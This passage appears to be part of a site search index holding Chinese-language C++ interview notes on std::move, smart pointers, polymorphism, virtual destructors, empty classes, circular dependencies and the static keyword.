\u7b2c\u4e8c\u884c\u4e0d\u80fd\u7f16\u8bd1\u901a\u8fc7\uff0c\u56e0\u4e3aa\u662f\u5de6\u503c\uff0c\u4f46\u662f\u53c2\u6570unique_ptr&& source\u53ea\u80fd\u63a5\u53d7\u53f3\u503c\uff0c\u8fd9\u6b63\u662f\u6211\u4eec\u6240\u9700\u8981\u7684\uff0c\u675c\u7edd\u5371\u9669\u7684\u9690\u5f0f\u8f6c\u79fb\u3002\u7b2c\u4e09\u884c\u7f16\u8bd1\u6ca1\u6709\u95ee\u9898\uff0c\u56e0\u4e3amake_triangle()\u662f\u53f3\u503c\uff0c\u8f6c\u79fb\u6784\u9020\u51fd\u6570\u4f1a\u5c06\u4e34\u65f6\u5bf9\u8c61\u7684\u6240\u6709\u6743\u8f6c\u79fb\u7ed9\u5bf9\u8c61c\uff0c\u8fd9\u6b63\u662f\u6211\u4eec\u9700\u8981\u7684\u3002 C++ 11\u5728\u6807\u51c6\u5e93\u7684\u5934\u6587\u4ef6< utility >\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6a21\u677f\u51fd\u6570std::move\u3002\u5b9e\u9645\u4e0a\uff0cstd::move\u4ec5\u4ec5\u662f\u7b80\u5355\u5730\u5c06\u5de6\u503c\u8f6c\u6362\u4e3a\u53f3\u503c\uff0c\u5b83\u672c\u8eab\u5e76\u6ca1\u6709\u8f6c\u79fb\u4efb\u4f55\u4e1c\u897f\u3002\u5b83\u4ec5\u4ec5\u662f\u8ba9\u5bf9\u8c61\u53ef\u4ee5\u8f6c\u79fb\u3002\u4ee5\u4e0b\u662f\u5982\u4f55\u6b63\u786e\u7684\u8f6c\u79fb\u5de6\u503c\uff1a unique_ptr<Shape> a(new Triangle); unique_ptr<Shape> b(a); // still an error unique_ptr<Shape> c(std::move(a)); // okay \u8bf7\u6ce8\u610f\uff0c\u7b2c\u4e09\u884c\u4e4b\u540e\uff0ca\u4e0d\u518d\u62e5\u6709Triangle\u5bf9\u8c61\u3002\u4e0d\u8fc7\u8fd9\u6ca1\u6709\u5173\u7cfb\uff0c\u56e0\u4e3a\u901a\u8fc7\u660e\u786e\u7684\u5199\u51fastd::move(a)\uff0c\u6211\u4eec\u5f88\u6e05\u695a\u6211\u4eec\u7684\u610f\u56fe\uff1a\u4eb2\u7231\u7684\u8f6c\u79fb\u6784\u9020\u51fd\u6570\uff0c\u4f60\u53ef\u4ee5\u5bf9a\u505a\u4efb\u4f55\u60f3\u8981\u505a\u7684\u4e8b\u60c5\u6765\u521d\u59cb\u5316c\uff1b\u6211\u4e0d\u518d\u9700\u8981a\u4e86\uff0c\u5bf9\u4e8ea\uff0c\u60a8\u8bf7\u81ea\u4fbf\u3002 \u5f53\u7136\uff0c\u5982\u679c\u4f60\u5728\u4f7f\u7528\u4e86mova(a)\u4e4b\u540e\uff0c\u8fd8\u7ee7\u7eed\u4f7f\u7528a\uff0c\u90a3\u65e0\u7591\u662f\u642c\u8d77\u77f3\u5934\u7838\u81ea\u5df1\u7684\u811a\uff0c\u8fd8\u662f\u4f1a\u5bfc\u81f4\u4e25\u91cd\u7684\u8fd0\u884c\u9519\u8bef\u3002 \u603b\u4e4b\uff0cstd::move(some_lvalue)\u5c06\u5de6\u503c\u8f6c\u6362\u4e3a\u53f3\u503c\uff08\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u79cd\u7c7b\u578b\u8f6c\u6362\uff09\uff0c\u4f7f\u63a5\u4e0b\u6765\u7684\u8f6c\u79fb\u6210\u4e3a\u53ef\u80fd\u3002 \u667a\u80fd\u6307\u9488 C++\u91cc\u9762\u7684\u56db\u4e2a\u667a\u80fd\u6307\u9488: auto_ptr, unique_ptr,shared_ptr, weak_ptr \u5176\u4e2d\u540e\u4e09\u4e2a\u662fC++11\u652f\u6301\uff0c\u5e76\u4e14\u7b2c\u4e00\u4e2a\u5df2\u7ecf\u88abC++11\u5f03\u7528\u3002 unique_ptr\u5b9e\u73b0\u72ec\u5360\u5f0f\u62e5\u6709\u6216\u4e25\u683c\u62e5\u6709\u6982\u5ff5\uff0c\u4fdd\u8bc1\u540c\u4e00\u65f6\u95f4\u5185\u53ea\u6709\u4e00\u4e2a\u667a\u80fd\u6307\u9488\u53ef\u4ee5\u6307\u5411\u8be5\u5bf9\u8c61\u3002\u5b83\u5bf9\u4e8e\u907f\u514d\u8d44\u6e90\u6cc4\u9732(\u4f8b\u5982\u201c\u4ee5new\u521b\u5efa\u5bf9\u8c61\u540e\u56e0\u4e3a\u53d1\u751f\u5f02\u5e38\u800c\u5fd8\u8bb0\u8c03\u7528delete\u201d)\u7279\u522b\u6709\u7528\u3002 shared_ptr\u5b9e\u73b0\u5171\u4eab\u5f0f\u62e5\u6709\u6982\u5ff5\u3002\u591a\u4e2a\u667a\u80fd\u6307\u9488\u53ef\u4ee5\u6307\u5411\u76f8\u540c\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u548c\u5176\u76f8\u5173\u8d44\u6e90\u4f1a\u5728\u201c\u6700\u540e\u4e00\u4e2a\u5f15\u7528\u88ab\u9500\u6bc1\u201d\u65f6\u5019\u91ca\u653e\u3002\u4ece\u540d\u5b57share\u5c31\u53ef\u4ee5\u770b\u51fa\u4e86\u8d44\u6e90\u53ef\u4ee5\u88ab\u591a\u4e2a\u6307\u9488\u5171\u4eab\uff0c\u5b83\u4f7f\u7528\u8ba1\u6570\u673a\u5236\u6765\u8868\u660e\u8d44\u6e90\u88ab\u51e0\u4e2a\u6307\u9488\u5171\u4eab\u3002\u53ef\u4ee5\u901a\u8fc7\u6210\u5458\u51fd\u6570use_count()\u6765\u67e5\u770b\u8d44\u6e90\u7684\u6240\u6709\u8005\u4e2a\u6570\u3002\u9664\u4e86\u53ef\u4ee5\u901a\u8fc7new\u6765\u6784\u9020\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u4f20\u5165auto_ptr, unique_ptr,weak_ptr\u6765\u6784\u9020\u3002\u5f53\u6211\u4eec\u8c03\u7528release()\u65f6\uff0c\u5f53\u524d\u6307\u9488\u4f1a\u91ca\u653e\u8d44\u6e90\u6240\u6709\u6743\uff0c\u8ba1\u6570\u51cf\u4e00\u3002\u5f53\u8ba1\u6570\u7b49\u4e8e0\u65f6\uff0c\u8d44\u6e90\u4f1a\u88ab\u91ca\u653e\u3002 shared_ptr \u662f\u4e3a\u4e86\u89e3\u51b3 auto_ptr \u5728\u5bf9\u8c61\u6240\u6709\u6743\u4e0a\u7684\u5c40\u9650\u6027(auto_ptr \u662f\u72ec\u5360\u7684), \u5728\u4f7f\u7528\u5f15\u7528\u8ba1\u6570\u7684\u673a\u5236\u4e0a\u63d0\u4f9b\u4e86\u53ef\u4ee5\u5171\u4eab\u6240\u6709\u6743\u7684\u667a\u80fd\u6307\u9488\u3002 \u6210\u5458\u51fd\u6570\uff1a use_count \u8fd4\u56de\u5f15\u7528\u8ba1\u6570\u7684\u4e2a\u6570 unique \u8fd4\u56de\u662f\u5426\u662f\u72ec\u5360\u6240\u6709\u6743( use_count \u4e3a 1) swap \u4ea4\u6362\u4e24\u4e2a shared_ptr \u5bf9\u8c61(\u5373\u4ea4\u6362\u6240\u62e5\u6709\u7684\u5bf9\u8c61) reset \u653e\u5f03\u5185\u90e8\u5bf9\u8c61\u7684\u6240\u6709\u6743\u6216\u62e5\u6709\u5bf9\u8c61\u7684\u53d8\u66f4, \u4f1a\u5f15\u8d77\u539f\u6709\u5bf9\u8c61\u7684\u5f15\u7528\u8ba1\u6570\u7684\u51cf\u5c11 get \u8fd4\u56de\u5185\u90e8\u5bf9\u8c61(\u6307\u9488), \u7531\u4e8e\u5df2\u7ecf\u91cd\u8f7d\u4e86()\u65b9\u6cd5, \u56e0\u6b64\u548c\u76f4\u63a5\u4f7f\u7528\u5bf9\u8c61\u662f\u4e00\u6837\u7684 share_ptr\u867d\u7136\u5df2\u7ecf\u5f88\u597d\u7528\u4e86\uff0c\u4f46\u662f\u6709\u4e00\u70b9share_ptr\u667a\u80fd\u6307\u9488\u8fd8\u662f\u6709\u5185\u5b58\u6cc4\u9732\u7684\u60c5\u51b5\uff0c\u5f53\u4e24\u4e2a\u5bf9\u8c61\u76f8\u4e92\u4f7f\u7528\u4e00\u4e2ashared_ptr\u6210\u5458\u53d8\u91cf\u6307\u5411\u5bf9\u65b9\uff0c\u4f1a\u9020\u6210\u5faa\u73af\u5f15\u7528\uff0c\u4f7f\u5f15\u7528\u8ba1\u6570\u5931\u6548\uff0c\u4ece\u800c\u5bfc\u81f4\u5185\u5b58\u6cc4\u6f0f\u3002 weak_ptr \u662f\u4e00\u79cd\u4e0d\u63a7\u5236\u5bf9\u8c61\u751f\u547d\u5468\u671f\u7684\u667a\u80fd\u6307\u9488, \u5b83\u6307\u5411\u4e00\u4e2a shared_ptr \u7ba1\u7406\u7684\u5bf9\u8c61. \u8fdb\u884c\u8be5\u5bf9\u8c61\u7684\u5185\u5b58\u7ba1\u7406\u7684\u662f\u90a3\u4e2a\u5f3a\u5f15\u7528\u7684shared_ptr\uff0c weak_ptr\u53ea\u662f\u63d0\u4f9b\u4e86\u5bf9\u7ba1\u7406\u5bf9\u8c61\u7684\u4e00\u4e2a\u8bbf\u95ee\u624b\u6bb5\u3002weak_ptr \u8bbe\u8ba1\u7684\u76ee\u7684\u662f\u4e3a\u914d\u5408 shared_ptr \u800c\u5f15\u5165\u7684\u4e00\u79cd\u667a\u80fd\u6307\u9488\u6765\u534f\u52a9 shared_ptr \u5de5\u4f5c, \u5b83\u53ea\u53ef\u4ee5\u4ece\u4e00\u4e2a shared_ptr \u6216\u53e6\u4e00\u4e2a weak_ptr \u5bf9\u8c61\u6784\u9020, \u5b83\u7684\u6784\u9020\u548c\u6790\u6784\u4e0d\u4f1a\u5f15\u8d77\u5f15\u7528\u8bb0\u6570\u7684\u589e\u52a0\u6216\u51cf\u5c11\u3002weak_ptr\u662f\u7528\u6765\u89e3\u51b3shared_ptr\u76f8\u4e92\u5f15\u7528\u65f6\u7684\u6b7b\u9501\u95ee\u9898,\u5982\u679c\u8bf4\u4e24\u4e2ashared_ptr\u76f8\u4e92\u5f15\u7528,\u90a3\u4e48\u8fd9\u4e24\u4e2a\u6307\u9488\u7684\u5f15\u7528\u8ba1\u6570\u6c38\u8fdc\u4e0d\u53ef\u80fd\u4e0b\u964d\u4e3a0,\u8d44\u6e90\u6c38\u8fdc\u4e0d\u4f1a\u91ca\u653e\u3002\u5b83\u662f\u5bf9\u5bf9\u8c61\u7684\u4e00\u79cd\u5f31\u5f15\u7528\uff0c\u4e0d\u4f1a\u589e\u52a0\u5bf9\u8c61\u7684\u5f15\u7528\u8ba1\u6570\uff0c\u548cshared_ptr\u4e4b\u95f4\u53ef\u4ee5\u76f8\u4e92\u8f6c\u5316\uff0cshared_ptr\u53ef\u4ee5\u76f4\u63a5\u8d4b\u503c\u7ed9\u5b83\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528lock\u51fd\u6570\u6765\u83b7\u5f97shared_ptr\u3002 weak_ptr \u6ca1\u6709\u91cd\u8f7d*\u548c->\u4f46\u53ef\u4ee5\u4f7f\u7528 lock \u83b7\u5f97\u4e00\u4e2a\u53ef\u7528\u7684 shared_ptr \u5bf9\u8c61. \u6ce8\u610f, weak_ptr \u5728\u4f7f\u7528\u524d\u9700\u8981\u68c0\u67e5\u5408\u6cd5\u6027. expired \u7528\u4e8e\u68c0\u6d4b\u6240\u7ba1\u7406\u7684\u5bf9\u8c61\u662f\u5426\u5df2\u7ecf\u91ca\u653e, \u5982\u679c\u5df2\u7ecf\u91ca\u653e, \u8fd4\u56de true; \u5426\u5219\u8fd4\u56de false. lock \u7528\u4e8e\u83b7\u53d6\u6240\u7ba1\u7406\u7684\u5bf9\u8c61\u7684\u5f3a\u5f15\u7528(shared_ptr). \u5982\u679c expired \u4e3a true, \u8fd4\u56de\u4e00\u4e2a\u7a7a\u7684 shared_ptr; \u5426\u5219\u8fd4\u56de\u4e00\u4e2a shared_ptr, \u5176\u5185\u90e8\u5bf9\u8c61\u6307\u5411\u4e0e weak_ptr \u76f8\u540c. use_count \u8fd4\u56de\u4e0e shared_ptr \u5171\u4eab\u7684\u5bf9\u8c61\u7684\u5f15\u7528\u8ba1\u6570. reset \u5c06 weak_ptr \u7f6e\u7a7a. weak_ptr \u652f\u6301\u62f7\u8d1d\u6216\u8d4b\u503c, \u4f46\u4e0d\u4f1a\u5f71\u54cd\u5bf9\u5e94\u7684 shared_ptr \u5185\u90e8\u5bf9\u8c61\u7684\u8ba1\u6570.","title":"C++11 \u65b0\u7279\u6027"},{"location":"cplusplus/questions/#cpp20-new-features","text":"","title":"C++ 20 \u65b0\u7279\u6027"},{"location":"cplusplus/questions/#three-characteristics-of-cpp","text":"C++\u7684\u4e09\u5927\u7279\u6027\u4e3a\uff1a\u5c01\u88c5\u3001\u7ee7\u627f\u548c\u591a\u6001\u3002 \u5c01\u88c5\u6027\uff1a\u628a\u5ba2\u89c2\u4e8b\u7269\u5c01\u88c5\u6210\u62bd\u8c61\u7684\u7c7b\uff0c\u5e76\u4e14\u7c7b\u53ef\u4ee5\u628a\u81ea\u5df1\u7684\u6570\u636e\u548c\u65b9\u6cd5\u53ea\u8ba9\u53ef\u4fe1\u7684\u7c7b\u6216\u8005\u5bf9\u8c61\u64cd\u4f5c\uff0c\u5bf9\u4e0d\u53ef\u4fe1\u7684\u8fdb\u884c\u4fe1\u606f\u9690\u85cf\u3002 \u7c7b\u5c06\u6210\u5458\u53d8\u91cf\u548c\u6210\u5458\u51fd\u6570\u5c01\u88c5\u5728\u7c7b\u7684\u5185\u90e8\uff0c\u6839\u636e\u9700\u8981\u8bbe\u7f6e\u8bbf\u95ee\u6743\u9650\uff0c\u901a\u8fc7\u6210\u5458\u51fd\u6570\u7ba1\u7406\u5185\u90e8\u72b6\u6001\u3002 \u7ee7\u627f\uff1a\u987e\u540d\u601d\u4e49\uff0c\u5c31\u50cf\u5b69\u5b50\u4f1a\u7ee7\u627f\u7236\u6bcd\u7684\u4e00\u4e9b\u6027\u683c\u6216\u7279\u70b9\uff0c\u4e24\u4e2a\u7c7b\u5982\u679c\u5b58\u5728\u7ee7\u627f\u5173\u7cfb\uff0c\u5176\u5b50\u7c7b\u5fc5\u5b9a\u5177\u6709\u7236\u7c7b\u7684\u76f8\u5173\u5c5e\u6027\uff08\u5373\u53d8\u91cf\uff09\u548c\u65b9\u6cd5\uff08\u5373\u51fd\u6570\uff09\u3002\u7ee7\u627f\u7684\u4f5c\u7528\uff1a\u907f\u514d\u516c\u7528\u4ee3\u7801\u7684\u91cd\u590d\u5f00\u53d1\uff0c\u51cf\u5c11\u4ee3\u7801\u548c\u6570\u636e\u5197\u4f59\u3002 \u591a\u6001\uff1aC++\u4e2d\u6709\u4e24\u79cd\u591a\u6001\uff0c\u79f0\u4e3a \u52a8\u591a\u6001\uff08\u8fd0\u884c\u671f\u591a\u6001\uff09 \u548c \u9759\u591a\u6001\uff08\u7f16\u8bd1\u671f\u591a\u6001\uff09 \uff0c\u800c \u9759\u591a\u6001\u4e3b\u8981\u901a\u8fc7\u6a21\u677f\u6765\u5b9e\u73b0\uff0c\u5b8f\u4e5f\u662f\u5b9e\u73b0\u9759\u591a\u6001\u7684\u4e00\u79cd\u9014\u5f84 \u3002 \u52a8\u591a\u6001\u5728C++\u4e2d\u662f\u901a\u8fc7\u865a\u51fd\u6570\u5b9e\u73b0\u7684 \uff0c\u5373\u5728\u57fa\u7c7b\u4e2d\u5b58\u5728\u4e00\u4e9b\u63a5\u53e3\uff08\u4e00\u822c\u4e3a\u7eaf\u865a\u51fd\u6570\uff09\uff0c\u5b50\u7c7b\u5fc5\u987b\u91cd\u8f7d\u8fd9\u4e9b\u63a5\u53e3\u3002\u8fd9\u6837\u901a\u8fc7\u4f7f\u7528\u57fa\u7c7b\u7684\u6307\u9488\u6216\u8005\u5f15\u7528\u6307\u5411\u5b50\u7c7b\u7684\u5bf9\u8c61\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u8c03\u7528\u5b50\u7c7b\u5bf9\u5e94\u7684\u51fd\u6570\u7684\u529f\u80fd\u3002\u52a8\u591a\u6001\u7684\u51fd\u6570\u8c03\u7528\u673a\u5236\u662f\u6267\u884c\u671f\u624d\u80fd\u8fdb\u884c\u786e\u5b9a\uff0c\u6240\u4ee5\u5b83\u662f\u52a8\u6001\u7684\u3002","title":"C++ \u7684\u4e09\u5927\u7279\u6027"},{"location":"cplusplus/questions/#polymorphism-in-cpp","text":"C++\u7684\u591a\u6001\u6027\u662f\u901a\u8fc7\u8fdf\u7ed1\u5b9a\u6280\u672f\u6765\u5b9e\u73b0\u7684\u3002 C++\u7684\u591a\u6001\u6027\u7528\u4e00\u53e5\u8bdd\u6982\u62ec\u5c31\u662f\uff1a\u5728\u57fa\u7c7b\u7684\u51fd\u6570\u524d\u52a0\u4e0avirtual\u5173\u952e\u5b57\uff0c\u5728\u6d3e\u751f\u7c7b\u4e2d\u91cd\u5199\u8be5\u51fd\u6570\uff0c\u8fd0\u884c\u65f6\u5c06\u4f1a\u6839\u636e\u5bf9\u8c61\u7684\u5b9e\u9645\u7c7b\u578b\u6765\u8c03\u7528\u76f8\u5e94\u7684\u51fd\u6570\u3002\u5982\u679c\u5bf9\u8c61\u7c7b\u578b\u662f\u6d3e\u751f\u7c7b\uff0c\u5c31\u8c03\u7528\u6d3e\u751f\u7c7b\u7684\u51fd\u6570\uff1b\u5982\u679c\u5bf9\u8c61\u7c7b\u578b\u662f\u57fa\u7c7b\uff0c\u5c31\u8c03\u7528\u57fa\u7c7b\u7684\u51fd\u6570\u3002","title":"C++\u7684\u591a\u6001\u5b9e\u73b0\u539f\u7406"},{"location":"cplusplus/questions/#virtual-function","text":"","title":"\u4ec0\u4e48\u662f\u865a\u51fd\u6570"},{"location":"cplusplus/questions/#pure-virtual-function","text":"","title":"\u4ec0\u4e48\u662f\u7eaf\u865a\u51fd\u6570"},{"location":"cplusplus/questions/#sizeof-vtable-pointer","text":"","title":"\u865a\u8868\u6307\u9488\u7684\u5927\u5c0f"},{"location":"cplusplus/questions/#vtable-pointer","text":"","title":"\u865a\u51fd\u6570\u8868\u7684\u5b58\u653e\u5185\u5bb9"},{"location":"cplusplus/questions/#can-constructor-be-virtual","text":"\u6784\u9020\u51fd\u6570\u4e0d\u9700\u8981\u662f\u865a\u51fd\u6570\uff0c\u4e5f\u4e0d\u5141\u8bb8\u662f\u865a\u51fd\u6570\u3002 \u865a\u51fd\u6570\u7684\u8c03\u7528\u9700\u8981 vptr \u6307\u9488\uff0c\u800c\u8be5\u6307\u9488\u5b58\u653e\u5728\u5bf9\u8c61\u7684\u5185\u5bb9\u7a7a\u95f4\u4e2d\uff0c\u9700\u8981\u8c03\u7528\u6784\u9020\u51fd\u6570\u624d\u53ef\u4ee5\u521b\u5efa\u5b83\u7684\u503c\uff0c\u5426\u5219\u5373\u4f7f\u5f00\u8f9f\u4e86\u7a7a\u95f4\uff0c\u8be5 vptr \u6307\u9488\u4e3a\u968f\u673a\u503c\uff1b\u82e5\u6784\u9020\u51fd\u6570\u58f0\u660e\u4e3a\u865a\u51fd\u6570\uff0c\u90a3\u4e48\u7531\u4e8e\u5bf9\u8c61\u8fd8\u672a\u521b\u5efa\uff0c\u8fd8\u6ca1\u6709\u5185\u5b58\u7a7a\u95f4\uff0c\u66f4\u6ca1\u6709 vptr \u5730\u5740\u7528\u6765\u8c03\u7528\u865a\u51fd\u6570\u4e4b\u4e00\u7684\u6784\u9020\u51fd\u6570\u4e86\u3002","title":"\u6784\u9020\u51fd\u6570\u53ef\u4ee5\u662f\u865a\u51fd\u6570\u5417"},{"location":"cplusplus/questions/#can-destructor-be-virtual","text":"\u9996\u5148\u6790\u6784\u51fd\u6570\u53ef\u4ee5\u4e3a\u865a\u51fd\u6570\uff0c\u800c\u4e14\u5f53\u8981\u4f7f\u7528\u57fa\u7c7b\u6307\u9488\u6216\u5f15\u7528\u8c03\u7528\u5b50\u7c7b\u65f6\uff0c\u6700\u597d\u5c06\u57fa\u7c7b\u7684\u6790\u6784\u51fd\u6570\u58f0\u660e\u4e3a\u865a\u51fd\u6570\uff0c\u5426\u5219\u53ef\u4ee5\u5b58\u5728\u5185\u5b58\u6cc4\u9732\u7684\u95ee\u9898\u3002 \u4e3e\u4f8b\u8bf4\u660e\uff1a\u5047\u8bbe\u5b50\u7c7bB\u7ee7\u627f\u81ea\u57fa\u7c7bA\uff1b A *p = new B; delete p; \u6b64\u65f6\uff0c\u5982\u679c\u7c7bA\u7684\u6790\u6784\u51fd\u6570\u4e0d\u662f\u865a\u51fd\u6570\uff0c\u90a3\u4e48delete p\uff1b\u5c06\u4f1a\u4ec5\u4ec5\u8c03\u7528A\u7684\u6790\u6784\u51fd\u6570\uff0c\u53ea\u91ca\u653e\u4e86B\u5bf9\u8c61\u4e2d\u7684A\u90e8\u5206\uff0c\u800c\u6d3e\u751f\u51fa\u7684\u65b0\u7684\u90e8\u5206\u672a\u91ca\u653e\u6389\u3002 \u5982\u679c\u7c7bA\u7684\u6790\u6784\u51fd\u6570\u662f\u865a\u51fd\u6570\uff0cdelete p; \u5c06\u4f1a\u5148\u8c03\u7528B\u7684\u6790\u6784\u51fd\u6570\uff0c\u518d\u8c03\u7528A\u7684\u6790\u6784\u51fd\u6570\uff0c\u91ca\u653eB\u5bf9\u8c61\u7684\u6240\u6709\u7a7a\u95f4\u3002 \u8865\u5145\uff1a B *p = new B; delete p;\u65f6\u4e5f\u662f\u5148\u8c03\u7528B\u7684\u6790\u6784\u51fd\u6570\uff0c\u518d\u8c03\u7528A\u7684\u6790\u6784\u51fd\u6570\u3002","title":"\u6790\u6784\u51fd\u6570\u53ef\u4ee5\u662f\u865a\u51fd\u6570\u5417"},{"location":"cplusplus/questions/#empty-class","text":"\u5f53\u7a7a\u7c7bEmpty_one\u5b9a\u4e49\u4e00\u4e2a\u5bf9\u8c61\u65f6Empty_one pt;sizeof(pt)\u4ecd\u662f\u4e3a1\uff0c\u4f46\u7f16\u8bd1\u5668\u4f1a\u751f\u62104\u4e2a\u6210\u5458\u51fd\u6570\uff1a \u4e00\u4e2a\u7f3a\u7701\u7684\u6784\u9020\u51fd\u6570 \u4e00\u4e2a\u62f7\u8d1d\u6784\u9020\u51fd\u6570 \u4e00\u4e2a\u6790\u6784\u51fd\u6570 \u4e00\u4e2a\u8d4b\u503c\u8fd0\u7b97\u7b26\u3002 \u8fd9\u4e9b\u51fd\u6570\u53ea\u6709\u5728\u7b2c\u4e00\u6b21\u4f7f\u7528\u5b83\u4eec\u7684\u65f6\u5019\u624d\u4f1a\u751f\u6210\uff0c\u4ed6\u4eec\u90fd\u662finline\u5e76\u4e14public\u7684\u3002 class Empty { public: Empty(); //\u7f3a\u7701\u6784\u9020\u51fd\u6570 Empty(const Empty &rhs); //\u62f7\u8d1d\u6784\u9020\u51fd\u6570 ~Empty(); //\u6790\u6784\u51fd\u6570 Empty& operator=(const Empty &rhs); //\u8d4b\u503c\u8fd0\u7b97\u7b26 };","title":"\u4e00\u4e2a\u7a7a\u7c7b\u4f1a\u751f\u6210\u54ea\u4e9b\u51fd\u6570"},{"location":"cplusplus/questions/#left-value-right-value","text":"","title":"\u5de6\u503c\u548c\u53f3\u503c"},{"location":"cplusplus/questions/#smart-pointer","text":"","title":"\u4ec0\u4e48\u662f\u667a\u80fd\u6307\u9488\uff0c\u6709\u54ea\u51e0\u79cd\uff0c\u4f5c\u7528\uff0c\u5b9e\u73b0\u539f\u7406"},{"location":"cplusplus/questions/#circular-dependency","text":"\u82e5\u5b58\u5728\u4e24\u4e2a\u7c7bA\u3001B\u4f7f\u5f97A\u7c7b\u4e2d\u542b\u6709B\u7c7b\u7684\u5bf9\u8c61\u4e14B\u7c7b\u4e2d\u5305\u542bA\u7c7b\u7684\u5bf9\u8c61\uff0c\u5219\u79f0A\u3001B\u4e4b\u95f4\u5b58\u5728\u5faa\u73af\u4f9d\u8d56\u3002 class A { public: B b; }; class B { public: A a; }; \u82e5\u4e24\u4e2a\u7c7b\u4e4b\u95f4\u5b58\u5728\u5faa\u73af\u4f9d\u8d56\u5219\u5728\u7f16\u8bd1\u65f6\u4f1a\u62a5\u9519\uff0c\u539f\u56e0\u662f\u4e24\u4e2a\u7c7b\u4e2d\u5b58\u5728\u76f8\u4e92\u7684\u8c03\u7528\uff0c\u65e0\u6cd5\u4e3a\u4e24\u4e2a\u7c7b\u5206\u914d\u5177\u4f53\u7684\u7a7a\u95f4\u3002 \u4e0b\u9762\u7b80\u8ff0\u51e0\u4e2a\u89e3\u51b3\u5faa\u73af\u4f9d\u8d56\u7684\u65b9\u6cd5\u3002 \u4f7f\u7528\u6307\u9488\u4ee3\u66ff\u53d8\u91cf\u58f0\u660e\uff0c\u5982 class A { public: B *b; }; class B { public: A *a; }; \u8fd9\u6837\u5728\u7f16\u8bd1\u65f6\u5e76\u4e0d\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u6307\u9488\u7c7b\u578b\u5c31\u662f\u56db\u4e2a\u5b57\u8282\uff0c\u5728\u7f16\u8bd1\u65f6\u7f16\u8bd1\u5668\u77e5\u9053A\u3001B\u7c7b\u6240\u5360\u5185\u5b58\u7a7a\u95f4\u7684\u5927\u5c0f\uff0c\u6545\u5728\u7f16\u8bd1\u65f6\u4e0d\u4f1a\u62a5\u9519\u3002 \u65e2\u7136A\u3001B\u4e24\u4e2a\u7c7b\u76f8\u4e92\u5305\u542b\u8bf4\u660eA\u3001B\u4e24\u4e2a\u7c7b\u7684\u8026\u5408\u5ea6\u6bd4\u8f83\u9ad8\uff0c\u5219\u53ef\u4ee5\u5c06A\u3001B\u58f0\u660e\u4e3a\u4e00\u4e2a\u7c7b\uff0c\u7136\u540e\u4f7f\u7528\u6d3e\u751f\uff0c\u5c06A\u3001B\u58f0\u660e\u4e3a\u8be5\u7c7b\u7684\u5b50\u7c7b\uff0c\u4fee\u6539\u6240\u9700\u7684\u53d8\u91cf\u5373\u53ef\u3002","title":"\u5982\u4f55\u907f\u514d\u5faa\u73af\u4f9d\u8d56"},{"location":"cplusplus/questions/#unique_ptr-stdmove","text":"","title":"unique_ptr \u4e2d std::move() \u4f5c\u7528"},{"location":"cplusplus/questions/#static-keywords","text":"\u9650\u5236\u7b26\u53f7\u7684\u4f5c\u7528\u57df\u53ea\u5728\u672c\u7a0b\u5e8f\u6587\u4ef6 \u82e5\u53d8\u91cf\u6216\u51fd\u6570\uff08\u7edf\u79f0\u7b26\u53f7\uff09\u4f7f\u7528static\u4fee\u9970\uff0c\u5219\u53ea\u80fd\u5728\u672c\u7a0b\u5e8f\u6587\u4ef6\u5185\u4f7f\u7528\uff0c\u5176\u4ed6\u7a0b\u5e8f\u6587\u4ef6\u4e0d\u80fd\u8c03\u7528\uff08\u975estatic\u7684\u53ef\u4ee5\u901a\u8fc7extern \u5173\u952e\u5b57\u58f0\u660e\u8be5\u53d8\u91cf\u662f\u5728\u5176\u4ed6\u6587\u4ef6\u5185\u5b9a\u4e49\u7684\uff0c\u6b64\u6587\u4ef6\u53ef\u8c03\u7528\uff09\u3002\u4e0d\u52a0static\u4fee\u9970\u7684\uff0c\u5219\u9ed8\u8ba4\u662f\u53ef\u4ee5\u88ab\u5176\u4ed6\u7a0b\u5e8f\u6587\u4ef6\u8c03\u7528\u7684\u3002 \u6307\u5b9a\u53d8\u91cf\u7684\u5b58\u50a8\u4f4d\u7f6e \u5bf9\u4e8e\u51fd\u6570\u5185\u7684\u53d8\u91cf\u3002auto\u53d8\u91cf\uff08\u51fd\u6570\u5c40\u90e8\u53d8\u91cf\uff09\u90fd\u662f\u5728\u6808\u5185\u5b58\u533a\u5b58\u653e\uff0c\u51fd\u6570\u7ed3\u675f\u540e\u5c31\u81ea\u52a8\u91ca\u653e\u3002\u4f46\u662f\u5168\u5c40\u7684\u548c\u51fd\u6570\u5185\u5b9a\u4e49\u7684static\u53d8\u91cf\u90fd\u662f\u5b58\u653e\u5728\u6570\u636e\u533a\u7684\uff0c\u4e14\u53ea\u5b58\u4e00\u4efd\uff0c\u53ea\u5728\u6574\u4e2a\u7a0b\u5e8f\u7ed3\u675f\u540e\u624d\u81ea\u52a8\u91ca\u653e\u3002 \u7531\u4e8estatic\u53d8\u91cf\u53ea\u5b58\u4e00\u4efd\u5373\u540c\u4e00\u5730\u5740\uff0c\u6240\u4ee5\u4e0d\u7ba1\u51fd\u6570\u8c03\u7528\u591a\u5c11\u6b21\uff0c\u51fd\u6570\u5185\u5b9a\u4e49static\u53d8\u91cf\u7684\u8bed\u53e5\u53ea\u4f1a\u5728\u7b2c\u4e00\u6b21\u8c03\u7528\u65f6\u6267\u884c\uff0c\u540e\u9762\u8c03\u7528\u90fd\u4e0d\u6267\u884c\u4e5f\u4e0d\u518d\u521d\u59cb\u5316\uff0c\u800c\u662f\u5bf9\u8be5\u5730\u5740\u5185\u7684\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\u3002 C++\u7c7b\u7684\u9759\u6001\u6210\u5458\u53d8\u91cf 